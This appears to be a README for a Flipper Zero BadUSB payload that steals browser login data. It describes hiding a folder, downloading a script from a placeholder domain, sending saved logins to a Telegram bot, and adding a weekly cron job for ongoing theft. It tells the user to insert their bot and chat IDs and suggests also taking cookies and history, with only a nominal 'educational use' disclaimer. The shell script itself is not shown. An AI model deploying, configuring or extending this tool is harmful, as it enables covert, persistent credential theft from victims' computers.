# Browser Data Exfiltration

**Process**
  1. Creates a hidden folder to prepare data.
  2. Downloads the script to the hidden folder.
  3. Sends the initial gathered browser login data via Telegram.
  4. Creates a cronjob to exfiltrate data every week.

**What you need to do**
  1. Change `<your_chat_id>` in `browserdata.sh` to your Telegram chat ID.
  2. Change `<your_bot_id>` in `browserdata.sh` to your Telegram bot ID.
  3. Change `https://your.domain.com/browserdata.sh` in `browserdata.txt` to the link where your shell script is hosted.
  4. Transfer `browserdata.txt` to your FlipperZero device.
  
**How can you modify this?**
  1. Gather more browser data, e.g., cookies, history, bookmarks, etc.
  2. Use email instead of Telegram.
  3. Change the cronjob frequency.

> [!IMPORTANT]  
> For educational use only and should not be used for illegal activities.
